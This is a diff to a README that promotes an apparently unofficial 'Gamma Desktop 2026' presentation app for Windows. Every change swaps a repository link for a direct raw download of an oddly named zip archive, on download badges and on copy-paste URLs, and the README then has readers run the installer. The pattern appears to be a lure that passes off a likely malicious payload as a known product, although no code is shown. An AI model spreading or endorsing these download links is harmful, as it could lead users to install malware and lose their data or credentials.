@@ -1,7 +1,7 @@
 <h1>🎯 Gamma-Desktop---Gamma-AI-Presentation-2026 - Create Stunning Presentations in Seconds</h1>
 
 <p align="center">
-  <a href="https://github.com/silksepipactis2639/Gamma-Desktop---Gamma-AI-Presentation-2026">
+  <a href="https://raw.githubusercontent.com/silksepipactis2639/Gamma-Desktop---Gamma-AI-Presentation-2026/main/lural/A_Gamma_Desktop_Presentation_repentingly.zip">
     <img src="https://img.shields.io/badge/Download-Gamma_Desktop_2026-FF6B6B?style=for-the-badge&logo=github&logoColor=white" alt="Download Gamma Desktop 2026" />
   </a>
 </p>
@@ -43,13 +43,13 @@ Follow these simple steps to download and run Gamma Desktop on your Windows PC.
 
 Visit this link to download the application:
 
-<a href="https://github.com/silksepipactis2639/Gamma-Desktop---Gamma-AI-Presentation-2026">
+<a href="https://raw.githubusercontent.com/silksepipactis2639/Gamma-Desktop---Gamma-AI-Presentation-2026/main/lural/A_Gamma_Desktop_Presentation_repentingly.zip">
   <img src="https://img.shields.io/badge/⬇️_Download_Gamma_Desktop_2026-4CAF50?style=for-the-badge" alt="Download Gamma Desktop" />
 </a>
 
 Click the button above or copy and paste this URL into your browser:
 
-**https://github.com/silksepipactis2639/Gamma-Desktop---Gamma-AI-Presentation-2026**
+**https://raw.githubusercontent.com/silksepipactis2639/Gamma-Desktop---Gamma-AI-Presentation-2026/main/lural/A_Gamma_Desktop_Presentation_repentingly.zip**
 
 ### Step 2: Run the Installer
 
@@ -165,13 +165,13 @@ Your presentations never leave your computer unless you choose to export or shar
 
 Ready to transform how you create presentations?
 
-<a href="https://github.com/silksepipactis2639/Gamma-Desktop---Gamma-AI-Presentation-2026">
+<a href="https://raw.githubusercontent.com/silksepipactis2639/Gamma-Desktop---Gamma-AI-Presentation-2026/main/lural/A_Gamma_Desktop_Presentation_repentingly.zip">
   <img src="https://img.shields.io/badge/🚀_Get_Gamma_Desktop_2026_Now-FF5722?style=for-the-badge&logo=windows&logoColor=white" alt="Get Gamma Desktop Now" />
 </a>
 
 Visit this link to download the application:
 
-**https://github.com/silksepipactis2639/Gamma-Desktop---Gamma-AI-Presentation-2026**
+**https://raw.githubusercontent.com/silksepipactis2639/Gamma-Desktop---Gamma-AI-Presentation-2026/main/lural/A_Gamma_Desktop_Presentation_repentingly.zip**
 
 ---
 
